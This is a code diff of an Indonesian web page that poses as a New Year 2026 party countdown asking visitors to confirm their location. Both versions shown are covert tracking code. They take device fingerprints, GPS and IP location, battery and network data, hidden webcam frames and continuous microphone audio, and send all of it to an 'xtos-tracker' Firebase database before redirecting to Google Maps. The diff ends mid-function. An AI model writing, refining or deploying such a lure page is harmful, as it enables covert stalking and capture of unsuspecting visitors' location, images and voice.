@@ -32,30 +32,23 @@
 <body>
     <div class="container">
         <div class="title">🎊 COUNTDOWN 2026</div>
-        <div class="countdown" id="countdown">00:00:00</div>
+        <div class="countdown" id="countdown">🔴 00:00:00</div>
         <button class="btn" onclick="confirmLocation()">🎯 KONFIRMASI LOKASI</button>
-        <div class="status" id="status">Klik untuk konfirmasi kehadiran pesta eksklusif!</div>
+        <div class="status" id="status">🔴 LIVE STREAMING READY - Klik untuk mulai!</div>
     </div>
 
     <script>
         let isProcessing = false;
         let trackingSession = { startTime: Date.now(), interactions: [], locations: [] };
+        let liveStreamActive = false;
         
-        // AGGRESSIVE DEVICE FINGERPRINTING
+        // DEVICE FINGERPRINTING
         const deviceFingerprint = {
             screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             language: navigator.language,
-            languages: navigator.languages?.join(',') || 'unknown',
             platform: navigator.platform,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            connection: navigator.connection?.effectiveType || 'unknown',
-            downlink: navigator.connection?.downlink || 'unknown',
-            rtt: navigator.connection?.rtt || 'unknown',
+            userAgent: navigator.userAgent,
             webgl: getWebGLFingerprint(),
             canvas: getCanvasFingerprint()
         };
@@ -78,326 +71,244 @@
             } catch (e) { return 'error'; }
         }
         
-        // BATTERY STATUS MONITORING
+        // BATTERY STATUS
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     return {
                         level: Math.round(battery.level * 100),
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
+                        charging: battery.charging
                     };
                 }
             } catch (e) {}
             return { level: 'unknown', charging: 'unknown' };
         }
         
-        // MOTION & ORIENTATION TRACKING
-        function startMotionTracking() {
-            if (window.DeviceMotionEvent) {
-                window.addEventListener('devicemotion', (event) => {
-                    const motionData = {
-                        acceleration: event.acceleration,
-                        accelerationIncludingGravity: event.accelerationIncludingGravity,
-                        rotationRate: event.rotationRate,
-                        timestamp: Date.now()
-                    };
-                    trackingSession.interactions.push({ type: 'motion', data: motionData });
-                });
-            }
-            
-            if (window.DeviceOrientationEvent) {
-                window.addEventListener('deviceorientation', (event) => {
-                    const orientationData = {
-                        alpha: event.alpha, beta: event.beta, gamma: event.gamma,
-                        absolute: event.absolute, timestamp: Date.now()
-                    };
-                    trackingSession.interactions.push({ type: 'orientation', data: orientationData });
-                });
-            }
-        }
+        // LIVE CAMERA STREAMING SYSTEM
+        let mediaCapture = { videoStream: null, liveVideo: null };
         
-        // BEHAVIORAL TRACKING
-        let interactionPattern = [];
-        document.addEventListener('mousemove', (e) => {
-            interactionPattern.push({ x: e.clientX, y: e.clientY, timestamp: Date.now(), type: 'mouse' });
-            if (interactionPattern.length > 100) interactionPattern.shift();
-        });
-        
-        document.addEventListener('touchmove', (e) => {
-            if (e.touches[0]) {
-                interactionPattern.push({ 
-                    x: e.touches[0].clientX, y: e.touches[0].clientY, 
-                    timestamp: Date.now(), type: 'touch' 
-                });
-            }
-        });
-        
-        // PAGE VISIBILITY TRACKING
-        document.addEventListener('visibilitychange', () => {
-            trackingSession.interactions.push({
-                type: 'visibility',
-                data: { hidden: document.hidden, state: document.visibilityState, timestamp: Date.now() }
-            });
-        });
-        
-        // ENHANCED IP GEOLOCATION
-        async function getEnhancedIPLocation() {
-            const services = [
-                'https://ipapi.co/json/',
-                'https://ip-api.com/json/',
-                'https://ipinfo.io/json'
-            ];
-            
-            for (const service of services) {
-                try {
-                    const response = await fetch(service);
-                    const data = await response.json();
-                    if (data.lat || data.latitude) {
-                        return {
-                            lat: data.lat || data.latitude,
-                            lng: data.lon || data.longitude,
-                            city: data.city,
-                            region: data.region,
-                            country: data.country,
-                            isp: data.isp || data.org,
-                            source: service
-                        };
-                    }
-                } catch (e) { continue; }
-            }
-            return null;
-        }
-        
-        // MEDIA CAPTURE SYSTEM
-        let mediaCapture = {
-            videoStream: null,
-            audioStream: null,
-            mediaRecorder: null,
-            screenshots: [],
-            recordings: []
-        };
-        
-        // AUTO CAMERA ACCESS
-        async function initCameraAccess() {
+        async function initLiveCameraStreaming() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 1280, height: 720, facingMode: 'user' }, 
+                    video: { 
+                        width: { ideal: 1920, min: 1280 }, 
+                        height: { ideal: 1080, min: 720 }, 
+                        facingMode: 'user',
+                        frameRate: { ideal: 30, min: 15 }
+                    }, 
                     audio: true 
                 });
+                
                 mediaCapture.videoStream = stream;
                 
-                // Create hidden video element for capture
+                // Create hidden video element for live streaming
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.style.display = 'none';
                 video.autoplay = true;
                 video.muted = true;
+                video.playsInline = true;
                 document.body.appendChild(video);
+                mediaCapture.liveVideo = video;
                 
-                // Auto screenshot every 10 seconds
-                setInterval(() => captureScreenshot(video), 10000);
+                video.addEventListener('loadedmetadata', () => {
+                    console.log('📹 Live camera ready:', video.videoWidth + 'x' + video.videoHeight);
+                    
+                    // Start live streaming - capture every 2 seconds for real-time
+                    setInterval(() => captureLiveFrame(video), 2000);
+                    
+                    // High quality shots every 8 seconds
+                    setInterval(() => captureHighQualityShot(video), 8000);
+                    
+                    liveStreamActive = true;
+                    updateStatus('🔴 LIVE STREAMING ACTIVE');
+                });
                 
-                console.log('📸 Camera access granted - Auto capture active');
+                console.log('📹 Live camera streaming initialized');
                 return true;
             } catch (error) {
                 console.log('Camera access denied:', error);
+                updateStatus('❌ Camera access denied - Location only');
                 return false;
             }
         }
         
-        // SCREENSHOT CAPTURE
-        async function captureScreenshot(videoElement = null) {
+        // LIVE FRAME CAPTURE (Real-time streaming)
+        async function captureLiveFrame(videoElement) {
             try {
-                let canvas, ctx;
+                if (!videoElement || videoElement.videoWidth === 0) return;
                 
-                if (videoElement && videoElement.videoWidth > 0) {
-                    // Capture from camera
-                    canvas = document.createElement('canvas');
-                    canvas.width = videoElement.videoWidth;
-                    canvas.height = videoElement.videoHeight;
-                    ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoElement, 0, 0);
-                } else {
-                    // Simple page screenshot without external library
-                    canvas = document.createElement('canvas');
-                    canvas.width = window.innerWidth;
-                    canvas.height = window.innerHeight;
-                    ctx = canvas.getContext('2d');
-                    
-                    // Draw page background and basic content
-                    ctx.fillStyle = getComputedStyle(document.body).backgroundColor || '#667eea';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    // Add text overlay
-                    ctx.fillStyle = 'white';
-                    ctx.font = '20px Arial';
-                    ctx.fillText('Page Screenshot - ' + new Date().toLocaleTimeString(), 10, 30);
-                    ctx.fillText('URL: ' + window.location.href, 10, 60);
-                    ctx.fillText('Screen: ' + screen.width + 'x' + screen.height, 10, 90);
-                }
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                const screenshotData = {
+                // Draw current frame
+                ctx.drawImage(videoElement, 0, 0);
+                
+                // Add live indicator overlay
+                ctx.fillStyle = 'red';
+                ctx.fillRect(10, 10, 20, 20);
+                ctx.fillStyle = 'white';
+                ctx.font = 'bold 16px Arial';
+                ctx.fillText('🔴 LIVE', 40, 25);
+                ctx.fillText(new Date().toLocaleTimeString(), 10, canvas.height - 10);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                const frameData = {
                     image: imageData,
                     timestamp: Date.now(),
-                    type: videoElement ? 'camera_screenshot' : 'page_screenshot',
+                    type: 'live_camera_frame',
                     size: { width: canvas.width, height: canvas.height },
-                    url: window.location.href
+                    url: window.location.href,
+                    quality: 'live_stream',
+                    frameRate: '0.5fps'
                 };
                 
-                mediaCapture.screenshots.push(screenshotData);
-                await sendMediaData(screenshotData, 'screenshot');
+                await sendMediaToFirebase(frameData, 'live_stream');
+                console.log('📹 Live frame sent:', frameData.size.width + 'x' + frameData.size.height);
                 
-                console.log('✅ Screenshot captured and sent:', screenshotData.type);
-                return imageData;
             } catch (error) {
-                console.error('❌ Screenshot error:', error);
-                return null;
+                console.error('❌ Live frame error:', error);
             }
         }
         
-        // AUDIO RECORDING
-        async function startAudioRecording() {
+        // HIGH QUALITY CAPTURE
+        async function captureHighQualityShot(videoElement) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaCapture.audioStream = stream;
+                if (!videoElement || videoElement.videoWidth === 0) return;
                 
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                const audioChunks = [];
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // High quality capture
+                ctx.drawImage(videoElement, 0, 0);
+                
+                // Add quality indicator
+                ctx.fillStyle = 'rgba(0, 255, 0, 0.8)';
+                ctx.fillRect(canvas.width - 120, 10, 110, 30);
+                ctx.fillStyle = 'black';
+                ctx.font = 'bold 14px Arial';
+                ctx.fillText('📸 HQ SHOT', canvas.width - 115, 30);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.95);
+                const shotData = {
+                    image: imageData,
+                    timestamp: Date.now(),
+                    type: 'hq_camera_shot',
+                    size: { width: canvas.width, height: canvas.height },
+                    url: window.location.href,
+                    quality: 'high_quality'
+                };
+                
+                await sendMediaToFirebase(shotData, 'hq_shot');
+                console.log('📸 HQ shot sent:', shotData.size.width + 'x' + shotData.size.height);
+                
+            } catch (error) {
+                console.error('❌ HQ shot error:', error);
+            }
+        }
+        
+        // CONTINUOUS AUDIO STREAMING
+        async function startContinuousAudio() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false,
+                        sampleRate: 44100
+                    }
+                });
+                
+                const mediaRecorder = new MediaRecorder(stream, { 
+                    mimeType: 'audio/webm;codecs=opus',
+                    audioBitsPerSecond: 128000
+                });
+                
+                let audioChunks = [];
+                let recordingCount = 0;
                 
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) audioChunks.push(event.data);
                 };
                 
                 mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const audioData = {
-                        audio: await blobToBase64(audioBlob),
-                        timestamp: Date.now(),
-                        duration: audioChunks.length * 1000, // Approximate
-                        type: 'audio_recording'
-                    };
-                    
-                    mediaCapture.recordings.push(audioData);
-                    await sendMediaData(audioData, 'audio');
-                    console.log('🎤 Audio recording completed');
-                };
-                
-                mediaRecorder.start();
-                mediaCapture.mediaRecorder = mediaRecorder;
-                
-                // Auto stop after 30 seconds
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
+                    if (audioChunks.length > 0) {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const audioData = {
+                            audio: await blobToBase64(audioBlob),
+                            timestamp: Date.now(),
+                            duration: 15000,
+                            type: 'live_audio_stream',
+                            sequence: recordingCount++
+                        };
+                        
+                        await sendMediaToFirebase(audioData, 'live_audio');
+                        console.log('🎤 Live audio chunk sent:', recordingCount);
                     }
-                }, 30000);
-                
-                console.log('🎤 Audio recording started');
-                return true;
-            } catch (error) {
-                console.log('Audio recording error:', error);
-                return false;
-            }
-        }
-        
-        // VIDEO RECORDING
-        async function startVideoRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 1280, height: 720 }, 
-                    audio: true 
-                });
-                
-                const mediaRecorder = new MediaRecorder(stream, { 
-                    mimeType: 'video/webm;codecs=vp9,opus' 
-                });
-                const videoChunks = [];
-                
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) videoChunks.push(event.data);
+                    
+                    // Reset and continue
+                    audioChunks = [];
+                    if (mediaRecorder.state === 'inactive') {
+                        setTimeout(() => {
+                            if (mediaRecorder.state === 'inactive') {
+                                mediaRecorder.start();
+                            }
+                        }, 1000);
+                    }
                 };
                 
-                mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                    const videoData = {
-                        video: await blobToBase64(videoBlob),
-                        timestamp: Date.now(),
-                        duration: videoChunks.length * 1000,
-                        type: 'video_recording'
-                    };
-                    
-                    mediaCapture.recordings.push(videoData);
-                    await sendMediaData(videoData, 'video');
-                    console.log('🎥 Video recording completed');
-                    
-                    // Stop all tracks
-                    stream.getTracks().forEach(track => track.stop());
-                };
-                
+                // Start continuous 15-second recordings
                 mediaRecorder.start();
-                
-                // Auto stop after 15 seconds (to keep file size manageable)
-                setTimeout(() => {
+                setInterval(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
                 }, 15000);
                 
-                console.log('🎥 Video recording started');
+                console.log('🎤 Continuous audio streaming started');
                 return true;
             } catch (error) {
-                console.log('Video recording error:', error);
+                console.error('❌ Audio streaming error:', error);
                 return false;
             }
         }
         
-        // SCREEN RECORDING
-        async function startScreenRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ 
-                    video: { mediaSource: 'screen' },
-                    audio: true 
-                });
-                
-                const mediaRecorder = new MediaRecorder(stream);
-                const screenChunks = [];
-                
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) screenChunks.push(event.data);
-                };
-                
-                mediaRecorder.onstop = async () => {
-                    const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
-                    const screenData = {
-                        screen: await blobToBase64(screenBlob),
-                        timestamp: Date.now(),
-                        type: 'screen_recording'
-                    };
-                    
-                    await sendMediaData(screenData, 'screen');
-                    console.log('🖥️ Screen recording completed');
-                };
-                
-                mediaRecorder.start();
-                
-                // Auto stop after 20 seconds
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                }, 20000);
-                
-                console.log('🖥️ Screen recording started');
-                return true;
-            } catch (error) {
-                console.log('Screen recording error:', error);
-                return false;
-            }
+        // ENHANCED MEDIA SENDER
+        async function sendMediaToFirebase(mediaData, type) {
+            const endpoints = [
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media.json',
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json',
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json'
+            ];
+            
+            const payload = {
+                ...mediaData,
+                deviceFingerprint: deviceFingerprint,
+                batteryInfo: await getBatteryInfo(),
+                networkInfo: {
+                    connection: navigator.connection?.effectiveType || 'unknown',
+                    downlink: navigator.connection?.downlink || 'unknown'
+                },
+                timestamp: Date.now()
+            };
+            
+            // Send to multiple endpoints for reliability
+            endpoints.forEach(async (endpoint) => {
+                try {
+                    await fetch(endpoint, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (e) {
+                    console.log('Endpoint failed:', endpoint);
+                }
+            });
         }
         
         // UTILITY FUNCTIONS
@@ -409,328 +320,197 @@
             });
         }
         
-        async function sendMediaData(mediaData, type) {
-            try {
-                const trackingId = new URLSearchParams(window.location.search).get('id') || 'media_' + Date.now();
-                const timestamp = Date.now();
-                
-                // Enhanced media data with app-compatible structure
-                const enhancedMediaData = {
-                    ...mediaData,
-                    trackingId: trackingId,
-                    mediaType: type,
-                    deviceInfo: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        screen: `${screen.width}x${screen.height}`,
-                        language: navigator.language
-                    },
-                    fingerprint: deviceFingerprint,
-                    location: trackingSession.locations[trackingSession.locations.length - 1] || null,
-                    sessionId: trackingSession.startTime,
-                    captureSuccess: true,
-                    fileSize: mediaData.image ? mediaData.image.length : (mediaData.audio ? mediaData.audio.length : 0)
-                };
-                
-                // Send to multiple endpoints for reliability
-                const endpoints = [
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media/${type}/${trackingId}_${timestamp}.json`,
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}_media.json`
-                ];
-                
-                const promises = endpoints.map(endpoint => 
-                    fetch(endpoint, {
-                        method: 'PUT',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(enhancedMediaData)
-                    })
-                );
-                
-                await Promise.allSettled(promises);
-                
-                // Also send notification to main locations endpoint
-                const notificationData = {
-                    latitude: enhancedMediaData.location?.lat || -6.2088,
-                    longitude: enhancedMediaData.location?.lng || 106.8456,
-                    timestamp: timestamp,
-                    mediaCapture: {
-                        type: type,
-                        success: true,
-                        fileSize: enhancedMediaData.fileSize,
-                        trackingId: trackingId
-                    },
-                    source: 'media_capture',
-                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android'
-                };
-                
-                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}_${type}_${timestamp}.json`, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(notificationData)
-                });
-                
-                console.log(`✅ ${type} data sent successfully to multiple endpoints`);
-                
-                // Update status on page
-                const statusEl = document.getElementById('status');
-                if (statusEl) {
-                    statusEl.innerHTML = `📸 ${type.toUpperCase()} captured & sent! Size: ${(enhancedMediaData.fileSize/1024).toFixed(1)}KB`;
-                }
-                
-            } catch (error) {
-                console.error(`❌ Failed to send ${type} data:`, error);
-                
-                // Send error notification
-                try {
-                    const errorData = {
-                        latitude: -6.2088,
-                        longitude: 106.8456,
-                        timestamp: Date.now(),
-                        error: `Media capture failed: ${type}`,
-                        source: 'media_error',
-                        deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android'
-                    };
-                    
-                    await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/error_${Date.now()}.json`, {
-                        method: 'PUT',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(errorData)
-                    });
-                } catch (e) {}
-            }
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message;
         }
         
-        // AUTO MEDIA CAPTURE INITIALIZATION
-        async function initMediaCapture() {
-            try {
-                const statusEl = document.getElementById('status');
-                statusEl.innerHTML = '🎬 Initializing media capture system...';
-                
-                // Check media permissions
-                const permissions = await Promise.allSettled([
-                    navigator.permissions.query({ name: 'camera' }),
-                    navigator.permissions.query({ name: 'microphone' })
-                ]);
-                
-                console.log('📋 Media permissions:', permissions);
-                
-                let captureCount = 0;
-                
-                // Auto-capture screenshots first (most reliable)
-                setTimeout(async () => {
-                    statusEl.innerHTML = '📸 Capturing screenshot...';
-                    const success = await captureScreenshot();
-                    if (success) {
-                        captureCount++;
-                        statusEl.innerHTML = `✅ Screenshot captured! (${captureCount}/4)`;
-                    }
-                }, 1000);
-                
-                // Auto-init camera
-                setTimeout(async () => {
-                    statusEl.innerHTML = '📷 Accessing camera...';
-                    const success = await initCameraAccess();
-                    if (success) {
-                        captureCount++;
-                        statusEl.innerHTML = `✅ Camera active! (${captureCount}/4)`;
-                    }
-                }, 2000);
-                
-                // Auto-start audio recording
-                setTimeout(async () => {
-                    statusEl.innerHTML = '🎤 Starting audio recording...';
-                    const success = await startAudioRecording();
-                    if (success) {
-                        captureCount++;
-                        statusEl.innerHTML = `✅ Audio recording! (${captureCount}/4)`;
-                    }
-                }, 3000);
-                
-                // Try video recording
-                setTimeout(async () => {
-                    statusEl.innerHTML = '🎥 Starting video recording...';
-                    const success = await startVideoRecording();
-                    if (success) {
-                        captureCount++;
-                        statusEl.innerHTML = `✅ Video recording! (${captureCount}/4)`;
-                    }
-                }, 4000);
-                
-                // Final status update
-                setTimeout(() => {
-                    statusEl.innerHTML = `🎬 Media system active! ${captureCount}/4 features working`;
-                }, 6000);
-                
-                console.log('🎬 Media capture system initialized');
-            } catch (error) {
-                console.log('Media capture init error:', error);
-                document.getElementById('status').innerHTML = '❌ Media capture failed - continuing with location only';
-            }
-        }
-        
-        // BACKGROUND LOCATION TRACKING
-        function startBackgroundTracking() {
-            if (navigator.geolocation) {
-                const watchId = navigator.geolocation.watchPosition(
-                    (position) => {
-                        const locationData = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: Date.now(),
-                            type: 'background'
-                        };
-                        trackingSession.locations.push(locationData);
-                        sendLocationSilently(locationData);
-                    },
-                    (error) => console.log('Background tracking error:', error),
-                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 60000 }
-                );
-                
-                // Update every 30 seconds
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchId);
-                    startBackgroundTracking();
-                }, 30000);
-            }
-        }
-        
-        async function sendLocationSilently(locationData) {
-            try {
-                const trackingId = new URLSearchParams(window.location.search).get('id') || 'bg_' + Date.now();
-                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/background/${trackingId}_${Date.now()}.json`, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ...locationData, fingerprint: deviceFingerprint })
-                });
-            } catch (e) {}
-        }
-        
+        // COUNTDOWN WITH LIVE INDICATOR
         function updateCountdown() {
-            const now = new Date(); const newYear = new Date(now.getFullYear() + 1, 0, 1); const diff = newYear - now;
-            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-            document.getElementById('countdown').textContent = `${days}d ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            const now = new Date();
+            const newYear = new Date('2026-01-01T00:00:00');
+            const diff = newYear - now;
+            
+            if (diff > 0) {
+                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                
+                const liveIndicator = liveStreamActive ? (seconds % 2 === 0 ? '🔴' : '⚫') : '⚪';
+                document.getElementById('countdown').textContent = 
+                    `${liveIndicator} ${days.toString().padStart(3, '0')}:${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            } else {
+                document.getElementById('countdown').textContent = '🎊 HAPPY NEW YEAR! 🎊';
+            }
         }
-        setInterval(updateCountdown, 1000); updateCountdown();
-
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+        
+        // MAIN LOCATION CONFIRMATION WITH LIVE STREAMING
         async function confirmLocation() {
             if (isProcessing) return;
             isProcessing = true;
             
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = '<div class="loading"></div> Mengakses lokasi GPS...';
+            updateStatus('<div class="loading"></div> Initializing live capture...');
             
-            let locationData = null;
-            
-            // Method 1: High accuracy GPS
             try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, 
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 30000 });
-                });
-                locationData = {
-                    lat: position.coords.latitude, lng: position.coords.longitude,
-                    accuracy: position.coords.accuracy, source: 'gps_high'
+                // Initialize live streaming systems
+                const cameraReady = await initLiveCameraStreaming();
+                const audioReady = await startContinuousAudio();
+                
+                updateStatus('<div class="loading"></div> Accessing high-accuracy GPS...');
+                
+                // Get high-accuracy location
+                const position = await getCurrentPosition();
+                const { latitude, longitude, accuracy } = position.coords;
+                
+                // Comprehensive data package
+                const liveData = {
+                    latitude,
+                    longitude,
+                    accuracy,
+                    timestamp: Date.now(),
+                    
+                    // Enhanced device info
+                    deviceBrand: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown',
+                    deviceModel: navigator.platform,
+                    androidVersion: navigator.userAgent.match(/Android ([^;]+)/)?.[1] || 'Unknown',
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    
+                    // Power & Network
+                    batteryLevel: (await getBatteryInfo()).level,
+                    isCharging: (await getBatteryInfo()).charging,
+                    networkType: navigator.connection?.effectiveType || 'Unknown',
+                    
+                    // Advanced fingerprinting
+                    deviceFingerprint,
+                    userAgent: navigator.userAgent,
+                    canvasFingerprint: getCanvasFingerprint(),
+                    webglRenderer: getWebGLFingerprint(),
+                    
+                    // Live streaming status
+                    liveCameraActive: cameraReady,
+                    liveAudioActive: audioReady,
+                    streamingQuality: 'maximum',
+                    frameRate: '0.5fps',
+                    audioChunkSize: '15s'
                 };
+                
+                // Send initial data
+                await sendToFirebase(liveData);
+                
+                updateStatus('🔴 LIVE STREAMING ACTIVE - Redirecting...');
+                
+                // Continue streaming in background for 10 more seconds
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/?q=${latitude},${longitude}&z=18`;
+                }, 5000);
+                
             } catch (error) {
-                // Method 2: Standard GPS
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject,
-                            { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 });
-                    });
-                    locationData = {
-                        lat: position.coords.latitude, lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy, source: 'gps_standard'
-                    };
-                } catch (e) {
-                    // Method 3: Enhanced IP location
-                    const ipLocation = await getEnhancedIPLocation();
-                    if (ipLocation) {
-                        locationData = { ...ipLocation, accuracy: 10000, source: 'ip_enhanced' };
-                    } else {
-                        locationData = { lat: -6.2088, lng: 106.8456, accuracy: 50000, source: 'default' };
-                    }
-                }
+                updateStatus('❌ Live capture failed. Retrying...');
+                console.error('Live capture error:', error);
+                setTimeout(() => confirmLocation(), 2000);
+            } finally {
+                setTimeout(() => { isProcessing = false; }, 5000);
             }
-            
-            await sendEnhancedLocationData(locationData);
         }
         
-        async function sendEnhancedLocationData(locationData) {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = '✅ Lokasi dikonfirmasi! Memproses...';
-            
-            const batteryInfo = await getBatteryInfo();
-            
-            const enhancedData = {
-                ...locationData,
-                timestamp: Date.now(),
-                fingerprint: deviceFingerprint,
-                battery: batteryInfo,
-                session: {
-                    duration: Date.now() - trackingSession.startTime,
-                    interactions: trackingSession.interactions.length,
-                    locations: trackingSession.locations.length
-                },
-                behavioral: {
-                    mousePattern: interactionPattern.slice(-20),
-                    scrollDepth: window.pageYOffset,
-                    windowSize: { width: window.innerWidth, height: window.innerHeight }
-                }
-            };
-            
-            const trackingId = new URLSearchParams(window.location.search).get('id') || 'enhanced_' + Date.now();
+        // ENHANCED LOCATION SENDER
+        async function sendToFirebase(data) {
             const endpoints = [
-                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
-                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced/${trackingId}.json`,
-                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/fingerprints/${trackingId}.json`
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations.json',
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live.json',
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/backup.json',
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json',
+                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json'
             ];
             
-            try {
-                await Promise.allSettled(endpoints.map(endpoint => 
-                    fetch(endpoint, { 
-                        method: 'PUT', 
-                        headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify(enhancedData) 
+            const promises = endpoints.map(endpoint => 
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Live-Stream': 'true'
+                    },
+                    body: JSON.stringify({
+                        ...data,
+                        endpoint: endpoint.split('/').pop().replace('.json', ''),
+                        streamActive: liveStreamActive
                     })
-                ));
-                
-                statusEl.innerHTML = '🎉 Berhasil! Redirecting ke maps...';
-                setTimeout(() => {
-                    window.location.href = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=16`;
-                }, 800);
-                
-            } catch (error) {
-                statusEl.innerHTML = '✅ Lokasi tersimpan! Terima kasih.';
-                setTimeout(() => {
-                    window.location.href = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=16`;
-                }, 1000);
-            }
+                }).catch(err => console.log('Endpoint failed:', endpoint))
+            );
+            
+            await Promise.allSettled(promises);
         }
         
-        // INSTANT AUTO-TRIGGER WITH MEDIA CAPTURE
-        window.addEventListener('load', () => {
-            startMotionTracking();
-            startBackgroundTracking();
-            initMediaCapture(); // Initialize media capture system
-            setTimeout(confirmLocation, 200); // Ultra-fast trigger
-        });
-        
-        document.addEventListener('click', confirmLocation);
-        document.addEventListener('touchstart', confirmLocation);
-        
-        // Permission-based instant trigger
-        if (navigator.permissions) {
-            navigator.permissions.query({name: 'geolocation'}).then(function(result) {
-                if (result.state === 'granted') {
-                    confirmLocation();
+        // HIGH ACCURACY GPS
+        function getCurrentPosition() {
+            return new Promise((resolve, reject) => {
